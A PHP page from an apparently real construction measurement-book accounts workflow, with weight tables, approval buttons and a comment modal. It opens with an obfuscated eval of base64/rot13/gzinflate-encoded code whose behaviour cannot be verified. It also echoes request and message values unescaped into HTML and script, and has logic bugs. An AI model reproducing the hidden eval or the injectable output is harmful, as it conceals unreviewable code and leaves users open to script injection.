				eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

				
				
				//echo $summary_str;
				
				//echo count($summary); 
				//$textbox_str2 .= $pre_textboxid."*".$mpage."*".$pre_mbookno."*"; echo $textbox_str2;
				//$textbox_str = $textbox_str1.$textbox_str2; //echo $textbox_str;
				?>
				<tr height='' bgcolor="">
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter'></td>
                    <td width='' colspan="4" class='labelcenter'>Total Weight</td>
                    <td width='' class='labelcenter'></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_8 != 0) { echo number_format($total_8,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_10 != 0) { echo number_format($total_10,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_12 != 0) { echo number_format($total_12,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_16 != 0) { echo number_format($total_16,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_20 != 0) { echo number_format($total_20,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_25 != 0) { echo number_format($total_25,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_28 != 0) { echo number_format($total_28,$pre_decimal,".",","); } ?></td>
                    <td width='' class='labelcenter' style="text-align:right"><?php if($total_32 != 0) { echo number_format($total_32,$pre_decimal,".",","); } ?></td>
					<td width='' class='labelcenter' style="text-align:right"><?php if($total_36 != 0) { echo number_format($total_36,$pre_decimal,".",","); } ?></td>
                    <!--<td width='' class='labelcenter'></td>-->
                </tr>
				<tr height='' bgcolor="">
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" class='labelcenter'>Total in kgs</td>
                   <td width='' colspan="5" class='labelcenter'><?php echo number_format($totalweight_KGS,$pre_decimal,".",",")." kgs"; ?></td>
                   <td width='' colspan="5" class='labelcenter'></td>
				   
                </tr>
				<tr height=''>
                   <td width='' class='labelcenter'></td>
                   <td width='' class='labelcenter'></td>
                   <td width='' colspan="4" align="right" class='labelbold'>Total in MT</td>
                   <td width='' colspan="5" align="center" class='labelbold'><?php echo number_format($totalweight_MT,$pre_decimal,".",",")." MT"; ?></td>
                   <td width='' colspan="5" class='labelbold' style='text-align:right'><?php echo getcompositepage($sheetid,$pre_subdivid,$rbn,$zone_id); ?></td>
				   
                </tr>
				<?php } ?>
<!--<tr style="border-style:none;">
<td style="border-style:none;" colspan="8" align="right" class="label"><?php //echo "<br/><br/>"; echo "Page ".$mpage."&nbsp;&nbsp;"; ?></td>
<td style="border-style:none;" colspan="7" align="center" class="label"><?php //echo "<br/><br/>"; //echo $staffname." - ".$designation; ?></td>
</tr>-->
<tr style="border-style:none;">
<td style="border-style:none;" colspan="9" align="right" class="label"><?php /*echo "<br/><br/>";*/ echo "Page ".$mpage."&nbsp;&nbsp;"; ?></td>
<td style="border-style:none;" colspan="7" align="center" class="label"><?php /*echo "<br/><br/>";*/ //echo "Prepared By"; ?></td>
</tr>
				<?php //echo "COUNT = ".$count;
				//$summary_str2 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$pre_mbookno.",".$mpage;
				$summary_str2 .= $pre_subdivname.",".$pre_subdivid.",".$totalweight_MT.",".$pre_divid.",".$mbookno.",".$mpage;
				$summary_str = $summary_str1.$summary_str2;
				$summary = explode(",",$summary_str);
				if($count>0)
				{
					for($y=0;$y<count($summary);$y+=6)
					{
						$y1 = $y; $y2 = $y+1; $y3 = $y+2; $y4 = $y+3; $y5 = $y+4; $y6 = $y+5;
						$pre_page = $summary[$y6];
						//MeasurementSteelinsert($fromdate,$todate,$sheetid,$summary[$y5],$pre_page,$summary[$y3],$rbn,$userid,$summary[$y2],$summary[$y4],$staffid);
					}
				}
				else
				{
				$pre_page = 1;
					//MeasurementSteelinsert($fromdate,$todate,$sheetid,$pre_mbookno,$mpage,$totalweight_MT,$rbn,$userid,$pre_subdivid,$pre_divid,$staffid);
				}
               }
               ?>
			   </table>
				
<?php 
$staffid_acc 		= $_SESSION['sid_acc'];
$staff_level_str 	= getstafflevel($staffid_acc);
$exp_staff_level_str = explode("@#*#@",$staff_level_str);
$staff_roleid 		= $exp_staff_level_str[0];
$staff_levelid 		= $exp_staff_level_str[1];
$AccVerification 	= AccVerificationCheck($sheetid,$rbn,$mbookno,'staff',$staff_levelid,'MB');
$AlStatusRes 		= AccountsLevelStatus($sheetid,$rbn,$mbookno,$zone_id,'S','staff');//($sheetid,$rbn);
$AcLevel 	= $AlStatusRes[0];
$AcStatus 	= $AlStatusRes[1];
$EndLevel 	= $AlStatusRes[2];
?>
	<input type="hidden" name="txt_boxid_str" id="txt_boxid_str" value="<?php echo rtrim($textbox_str1,"*"); ?>"  />
	<input type="hidden" name="txt_sheetid" id="txt_sheetid" value="<?php echo $sheetid; ?>"/>
	<input type="hidden" name="txt_zone_id" id="txt_zone_id" value="<?php echo $zone_id; ?>"/>
	<input type="hidden" name="txt_rbn_no" id="txt_rbn_no" value="<?php echo $rbn; ?>"/>
	<input type="hidden" name="txt_linkid" id="txt_linkid" value="<?php echo $linkid; ?>"/>
	<input type="hidden" name="txt_mbook_no" id="txt_mbook_no" value="<?php echo $mbookno; ?>"/>
	<input type="hidden" name="txt_acc_remarks_count" id="txt_acc_remarks_count" value="<?php echo $acc_remarks_count; ?>"/>
	<input type="hidden" name="txt_staffid_acc" id="txt_staffid_acc" value="<?php echo $staffid_acc; ?>"/>
	<input type="hidden" name="txt_staff_levelid_acc" id="txt_staff_levelid_acc" value="<?php echo $staff_levelid; ?>"/>
	<input type="hidden" name="txt_view" id="txt_view" value="<?php echo $_GET['view']; ?>"/>
	
	
			<div align="center" class="btn_outside_sect printbutton">
				<div class="btn_inside_sect"><input type="submit" name="back" value=" Back " /> </div>
<?php 
	$TranRes = AccountsLevelTransaction($sheetid,$rbn,$_SESSION['levelid']);
	$FWRoleName = GetRoleName($TranRes['Next'],$_SESSION['staff_section']);
	$BWRoleName = GetRoleName($TranRes['Prev'],$_SESSION['staff_section']);
	if(($AccVerification == 0)&&($AcLevel == $_SESSION['levelid']) && ($AcStatus != 'A')){//&&($EndLevel != $AcLevel)){ 
		//print_r($TranRes);exit;	
		//if(($TranRes['Check'] == 1)&&($TranRes['Curr'] == $_SESSION['levelid'])){
		if(($TranRes['Check'] == 1)&& ( ($TranRes['Curr'] == $_SESSION['levelid'])||(($EndLevel != $_SESSION['levelid'])||(($EndLevel = $_SESSION['levelid'])&&($AcStatus = ""))) ) ){

?>
		<input type="hidden" name="txt_fw_level" id="txt_fw_level" value="<?php echo $TranRes['Next']; ?>" />
		<input type="hidden" name="txt_bw_level" id="txt_bw_level" value="<?php echo $TranRes['Prev']; ?>" />
		<input type="hidden" name="txt_min_level" id="txt_min_level" value="<?php echo $TranRes['Min']; ?>" />
		<input type="hidden" name="txt_max_level" id="txt_max_level" value="<?php echo $TranRes['Max']; ?>" />
		<input type="hidden" name="txt_end_level" id="txt_end_level" value="<?php echo $EndLevel; ?>" />
		
		<?php if(($TranRes['Min'] == $_SESSION['levelid'])&&($TranRes['Max'] != $_SESSION['levelid'])){ ?>
			<div class="btn_inside_sect"><input type="submit" class="backbutton" name="forward" id="forward" value=" Forward to <?php echo $FWRoleName; ?>" /></div>
			<!--<div class="btn_inside_sect"><input type="submit" class="backbutton" name="send_to_civil" id="send_to_civil" value=" Send to Civil " /></div>-->
		<?php }else if(($TranRes['Max'] == $_SESSION['levelid'])&&($TranRes['Min'] != $_SESSION['levelid'])){ ?>
			<!--<div class="btn_inside_sect"><input type="submit" class="backbutton" name="accept" id="accept" value=" Accept MBook " /></div>-->
			<div class="btn_inside_sect"><input type="submit" class="backbutton" name="backward" id="backward" value=" Return to  <?php echo $BWRoleName; ?>" /></div>
		<?php }else if(($_SESSION['levelid'] > $TranRes['Min'])&&($_SESSION['levelid'] < $TranRes['Max'])){ ?>
			<div class="btn_inside_sect"><input type="submit" class="backbutton" name="backward" id="backward" value=" Return to  <?php echo $BWRoleName; ?>" /></div>
			<div class="btn_inside_sect"><input type="submit" class="backbutton" name="forward" id="forward" value=" Forward to <?php echo $FWRoleName; ?>" /></div>
		<?php }else if(($TranRes['Min'] == $_SESSION['levelid'])&&($TranRes['Max'] == $_SESSION['levelid'])){ ?>
			<!--<div class="btn_inside_sect"><input type="submit" class="backbutton" name="accept" id="accept" value=" Accept MBook " /></div>-->
			<!--<div class="btn_inside_sect"><input type="submit" class="backbutton" name="send_to_civil" id="send_to_civil" value=" Send to Civil " /></div>-->
		<?php }else{
				// Nothing will be displayed here. So it will be Empty
			  }
		}
	}
	if(($AccVerification == 0)&&($_SESSION['levelid'] >= $DecMinHighLevel)&&($_SESSION['levelid'] >= $TranRes['Curr'])){ ?>
		 	<div class="btn_inside_sect"><input type="submit" class="backbutton" name="send_to_civil" id="send_to_civil" value=" Send to Civil " /></div>
			<div class="btn_inside_sect"><input type="submit" class="backbutton" name="accept" id="accept" value=" Accept MBook " /></div>
		
<?php } ?>
			</div>
			
		<div id="basic-modal-content">
			<div align="center" class="popuptitle gradientbg">Accounts Section - Comment </div>
			<div style="float:left; padding-top:4px; width:267px; height:490px;">
				<img src="images/accounts_cmt_mb_bg_2.jpg" width="265" height="532" />
			</div>
			<div style="float:right; padding-top:50px; width:727px;" class="modal_content">
				<!--<input type="text" name="txt_item_name_modal" id="txt_item_name_modal"  />-->
				<table width="95%" bgcolor="#FFFFFF" class="label" align="center">
					<tr>	
						<td width="40%">Item No.</td>
						<td><input type="text" name="txt_item_no_acc" id="txt_item_no_acc" class="textbox_modal label" readonly="" /></td>
					</tr>
					<tr>
						<td>Work Description</td>
						<td><textarea name="txt_work_desc_acc" id="txt_work_desc_acc" rows="3" style="width:460px" class="textbox_modal label" readonly=""></textarea></td>
					</tr>
					<tr>
						<td>Dia of Rod</td>
						<td><input type="text" name="txt_dia_acc" id="txt_dia_acc" class="textbox_modal label" readonly="" /></td>
					</tr>
					<tr>
						<td>No.</td>
						<td><input type="text" name="txt_no_acc" id="txt_no_acc" class="textbox_modal label" readonly="" /></td>
					</tr>
					<tr>
						<td>Length</td>
						<td><input type="text" name="txt_length_acc" id="txt_length_acc" class="textbox_modal label" readonly="" /></td>
					</tr>
					<tr>
						<td>Contents of Area</td>
						<td>
						<input type="text" name="txt_contents_area_acc" id="txt_contents_area_acc" class="textbox_modal label" readonly="" style="width:460px" />
						<!--<input type="text" name="txt_item_unit_acc" id="txt_item_unit_acc" class="textbox_modal label" readonly="" style="text-align:left" />-->
						<input type="hidden" name="txt_mbdetail_id_acc" id="txt_mbdetail_id_acc" class="textbox_modal" readonly="" />
						<input type="hidden" name="txt_mbook_no_acc" id="txt_mbook_no_acc" class="textbox_modal" readonly="" />
						</td>
					</tr>
				</table>
			</div>
			<div style="float:right; width:727px; height:145px;" align="center">
				<p style="text-align:left" class="label textbox_modal">&nbsp;&nbsp;&nbsp;&nbsp;Accounts Comment: </p>
				<textarea name="txt_accounts_remarks" id="txt_accounts_remarks" placeholder="Enter your comment here..." class="label" rows="4" style="width:684px"></textarea>
			</div>
			<div align="center" style="float:right; width:727px; height:80px;">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData_Accounts()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
			<!--<div align="left" class="label">Accounts Comments</div>
			<div align="left" class="label">
				<textarea name="txt_accounts_remarks" id="txt_accounts_remarks" rows="4" style="width:250px"></textarea>
			</div>-->
		</div>

 </form>
<?php
$accurl = "";
if($msg != "")
{
	 $staffid_acc 			= $_SESSION['sid_acc'];
	 $staff_level_str 		= getstafflevel($staffid_acc);
	 $exp_staff_level_str 	= explode("@#*#@",$staff_level_str);
	 $staff_roleid 			= $exp_staff_level_str[0];
	 $staff_levelid 		= $exp_staff_level_str[1];
	 
	 $minmax_level_str 		= getstaff_minmax_level();
	 $exp_minmax_level_str 	= explode("@#*#@",$minmax_level_str);
	 $min_levelid 			= $exp_minmax_level_str[0];
	 $max_levelid 			= $exp_minmax_level_str[1];
	if($staff_levelid == $min_levelid)
	{
		$accurl = "MeasurementBookPrint_staff_Accounts.php";
	}
	else
	{
		$accurl = "MeasurementBookPrint_staff_AccountsL".$staff_levelid.".php";
	}
    //header('Location: '.$accurl);
}
?>
    </body>
	<script type="text/javascript">
   $(function(){ 
   var getstr = document.getElementById("txt_boxid_str").value;
   var splitval = getstr.split("*"); //alert(splitval.length);
   var x=0;
   for(x=0;x<splitval.length;x+=3)
   {
   		document.getElementById("txt_pageid"+splitval[x]).value = "C/o to page "+splitval[x+1]+" /Steel MB No. "+"<?php echo $mbookno; ?>"; 
   }
   });
   </script>
<script>

	var msg = "<?php echo $msg; ?>";
	var success = "<?php echo $success; ?>";
	var titletext = "";
	document.querySelector('#top').onload = function(){
	if(msg != "")
	{
		if(success == 1)
		{
				swal({ 
				  	title: "",
				   	text: msg,
					type: "success" 
				  },
				  function(){
					window.location.href = '<?php echo $accurl; ?>';
				});
		}
		else
		{
			swal(msg, "", "");
		}
					
	}
	};
</script>
</html>
	<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
	<script type='text/javascript' src='js/basic_model_jquery.js'></script>
	<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
	<script>
		function saveDataDetails_Accounts()
		{
			var mbdetail_id = document.getElementById("txt_mbdetail_id_acc").value;
			var remarks_acco = document.getElementById("txt_accounts_remarks").value;txt_mbook_no_acc
			var mbookno = document.getElementById("txt_mbook_no_acc").value;
			var sheetid = document.getElementById("txt_sheetid").value;
			var zone_id = document.getElementById("txt_zone_id").value;
			var rbn = document.getElementById("txt_rbn_no").value;
			var linkid = document.getElementById("txt_linkid").value;
			var staffid_acc = document.getElementById("txt_staffid_acc").value;
			var staff_levelid_acc = document.getElementById("txt_staff_levelid_acc").value;
			var mtype = "S";
			
			$.post("Accounts_Comments_Update_MBook.php", {mbdetail_id: mbdetail_id, remarks: remarks_acco, mbookno: mbookno, sheetid: sheetid, zone_id: zone_id, rbn: rbn, mtype: mtype, linkid: linkid, staffid: staffid_acc, levelid: staff_levelid_acc }, function (data) {
				if(data == 1)
				{
					location.reload();
				}
        	});
		}
		function SaveData_Accounts()
		{
			swal({   title: "Are you sure?",   
				text: "You want to update this data..?!",   
				type: "",   
				showCancelButton: true,   
				confirmButtonColor: "#DD6B55",   
				confirmButtonText: "Yes, Update!",   
				cancelButtonText: "No, Cancel!",   
				closeOnConfirm: false,   
				closeOnCancel: false }, 
				function(isConfirm){   
				if (isConfirm) 
				{     
					saveDataDetails_Accounts();  
				} 
				else 
				{     
					swal("Cancelled", "Your data not updated:)", "");   
				} 
			});
		}
		function CancelData()
		{
			swal({   title: "Are you sure?",   
				text: "You want to Cancel this operation..?!",   
				type: "",   
				showCancelButton: true,   
				confirmButtonColor: "#DD6B55",   
				confirmButtonText: "Yes, Cancel!",   
				cancelButtonText: "No, Stay on this!",   
				closeOnConfirm: true,   
				closeOnCancel: false }, 
				function(isConfirm){   
				if (isConfirm) 
				{   
					  
					$.modal.close();  
				} 
				else 
				{     
					swal({   
					title: "Please Wait!",   
					text: "Your Page will be redirected..",   
					timer: 2000,   showConfirmButton: false 
					});
				} 
			});
		}

		jQuery(function ($) 
		{
			
			$('input[name="check"]').click(function (e) 
			{
				var row_val = this.value;
				var split_val = row_val.split("@#*#@");
				var ac1;
				for(ac1 = 0; ac1<split_val.length; ac1++)
				{
					var mbdetail_id 	= split_val[0];
					var item_no 		= split_val[1];
					var descwork 		= split_val[2];
					var measurement_no 	= Number(split_val[3]);
					var measurement_l 	= Number(split_val[4]);
					var measurement_dia = Number(split_val[5]);
					var contentarea 	= Number(split_val[6]);
					var item_unit 		= split_val[7];
					var decimal 		= split_val[8];
					var remarks_acc 	= split_val[9];
					var mbook_no 		= split_val[10];
					$('#txt_item_no_acc').val(item_no);
					$('#txt_work_desc_acc').val(descwork);
					$('#txt_dia_acc').val(measurement_dia);
					$('#txt_no_acc').val(measurement_no);
					$('#txt_length_acc').val(measurement_l.toFixed(decimal));
					$('#txt_contents_area_acc').val(contentarea.toFixed(decimal));
					//$('#txt_item_unit_acc').val(item_unit);
					$('#txt_mbdetail_id_acc').val(mbdetail_id);
					$('#txt_accounts_remarks').val(remarks_acc);
					$('#txt_mbook_no_acc').val(mbook_no);
				}
				//$('#txt_item_name_modal').val(val);
				$('#basic-modal-content').modal();
			});
		});
	</script>
<style>
.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.gradientbg {
  /* fallback */
  background-color: #014D62;
  background: url(images/linear_bg_2.png);
  background-repeat: repeat-x;

  /* Safari 4-5, Chrome 1-9 */
  background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#037595), to(#0A9CC5));

  /* Safari 5.1, Chrome 10+ */
  background: -webkit-linear-gradient(top, #0A9CC5, #037595);

  /* Firefox 3.6+ */
  background: -moz-linear-gradient(top, #0A9CC5, #037595);

  /* IE 10 */
  background: -ms-linear-gradient(top, #0A9CC5, #037595);

  /* Opera 11.10+ */
  background: -o-linear-gradient(top, #0A9CC5, #037595);
}
div.modal_content tr, div.modal_content td

{
	padding-top:5px;
	padding-bottom:5px;
	color:#00008b;
	font-weight:bold;
	padding-left:3px;
}
.textbox_modal
{
	border:none;
	color:#00008b;
	font-weight:bold;
}
.buttonstyle
{
	background-color:#0A9CC5;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0A9CC5;
	-webkit-box-shadow: 0px 1px 0px 0px #0A9CC5;
	box-shadow: 0px 1px 0px 0px #0A9CC5;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0A9CC5));
	background:-moz-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0A9CC5 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0A9CC5 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0A9CC5',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}

</style>